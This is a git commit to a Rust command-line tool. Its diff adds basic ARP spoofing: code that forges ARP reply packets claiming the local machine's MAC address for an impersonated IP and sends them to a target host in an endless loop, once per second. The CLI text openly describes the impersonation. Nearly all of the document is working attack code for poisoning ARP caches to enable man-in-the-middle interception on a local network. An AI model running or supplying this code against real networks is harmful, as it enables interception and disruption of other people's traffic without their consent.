805dd07138e7d0357e8883f966b67000b841def8
Tomoya Ishigaki <steinwand.tomo@gmail.com>
2024-10-07 23:57:35 +0900

    feat: implement basic ARP spoofing functionality

--- src/main.rs
+++ src/main.rs
@@ -1,4 +1,4 @@
-use std::net::Ipv4Addr;
+use std::{net::Ipv4Addr, thread::sleep, time::Duration};
 
 use clap::Parser;
 use pnet::{
@@ -34,7 +34,7 @@ fn main() {
         .target_ip
         .parse()
         .expect("Unable to parse target_ip as IPv4 address");
-    let target_info = get_addr_by_ip(&interface, &local_info, target_ip);
+    let target_info = get_addr_by_ip(&interface, &local_info, target_ip).unwrap();
     println!("{:?}", target_info);
 
     // get source info
@@ -42,12 +42,13 @@ fn main() {
         .source_ip
         .parse()
         .expect("Unable to parse source_ip as IPv4 address");
-    let source_info = get_addr_by_ip(&interface, &local_info, source_ip);
-    println!("{:?}", source_info);
 
-    // send ARP packet
-
-    // recieve ARP packet
+    // arp spoofing
+    let spoofed_info = IpMacPair {
+        ip: source_ip,
+        mac: local_info.mac,
+    };
+    send_arp_spoofing_reply(&interface, &target_info, &spoofed_info);
 }
 
 #[derive(Debug)]
@@ -87,6 +88,56 @@ struct Cli {
     /// The IP address you want to impersonate (the source IP in the ARP response).
     #[arg(short, long, required = true)]
     source_ip: String,
+}
+
+fn send_arp_spoofing_reply(
+    interface: &NetworkInterface,
+    target_info: &IpMacPair,
+    spoofed_info: &IpMacPair,
+) {
+    let mut arp_req_ = [0; PKT_ARP_SIZE];
+    let arp_req = create_arp_reply(&mut arp_req_, &target_info, &spoofed_info);
+    let mut ether_req_ = [0; PKT_ETH_SIZE + PKT_ARP_SIZE];
+    let mut ether_req =
+        MutableEthernetPacket::new(&mut ether_req_).expect("Failed to create ethernet packet");
+    ether_req.set_destination(target_info.mac);
+    ether_req.set_source(spoofed_info.mac);
+    ether_req.set_ethertype(EtherTypes::Arp);
+    ether_req.set_payload(arp_req.packet());
+
+    loop {
+        let (mut ds, _) = match datalink::channel(&interface, Default::default()) {
+            Ok(datalink::Channel::Ethernet(ds, dr)) => (ds, dr),
+            Ok(_) => panic!("not channel"),
+            Err(e) => {
+                panic!("error {}", e);
+            }
+        };
+        ds.send_to(ether_req.packet(), None);
+        println!(
+            "{:?} < {:?} is {:?}'s MAC address...",
+            target_info.ip, spoofed_info.mac, spoofed_info.ip
+        );
+        sleep(Duration::from_secs(1));
+    }
+}
+
+fn create_arp_reply<'a>(
+    arp_packet: &'a mut [u8],
+    target_info: &IpMacPair,
+    source_info: &IpMacPair,
+) -> MutableArpPacket<'a> {
+    let mut packet = MutableArpPacket::new(arp_packet).expect("Failed to create ARP Reply");
+    packet.set_hardware_type(ArpHardwareType::new(1));
+    packet.set_protocol_type(EtherTypes::Ipv4);
+    packet.set_hw_addr_len(6);
+    packet.set_proto_addr_len(4);
+    packet.set_operation(ArpOperations::Reply);
+    packet.set_sender_hw_addr(source_info.mac);
+    packet.set_sender_proto_addr(source_info.ip);
+    packet.set_target_hw_addr(target_info.mac);
+    packet.set_target_proto_addr(target_info.ip);
+    packet
 }
 
 fn create_arp_request<'a>(
